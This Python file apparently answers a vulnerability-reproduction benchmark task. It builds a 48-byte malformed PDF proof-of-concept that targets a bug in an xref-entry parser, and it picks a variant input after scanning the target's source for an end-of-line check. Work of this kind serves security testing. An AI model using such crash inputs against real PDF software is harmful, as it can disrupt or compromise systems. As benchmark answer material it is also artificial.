import os
import tarfile
from typing import Optional


class Solution:
    def _find_read_xref_entry_source(self, src_path: str) -> Optional[str]:
        try:
            if not os.path.isfile(src_path):
                return None
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (name.endswith((".cc", ".cpp", ".c", ".h", ".hh", ".hpp"))):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    if b"read_xrefEntry" in data:
                        try:
                            return data.decode("utf-8", "ignore")
                        except Exception:
                            return data.decode("latin-1", "ignore")
        except Exception:
            return None
        return None

    def solve(self, src_path: str) -> bytes:
        # Primary 48-byte minimized PoC
        poc = b"%PDF-1.0\nxref\n0 1\n" + (b"0" * 20) + b" 00000 n \n"

        # Optional heuristic: if source strongly suggests EOL1 validation bug, try variant
        # that places an extra '0' right before '\n' while keeping total length 48.
        src = self._find_read_xref_entry_source(src_path)
        if src:
            s = src
            # Very lightweight heuristic: mentions of reading two EOL chars and checking only '\n'
            # often include patterns with '\r' and a secondary char compared to '\n'.
            if ("\\r" in s) and ("\\n" in s) and ("eol" in s or "end-of-line" in s or "end of line" in s):
                poc_variant = b"%PDF-1.0\nxref\n0 1\n" + (b"0" * 19) + b" 00000 n 0\n"
                if len(poc_variant) == 48:
                    return poc_variant

        return poc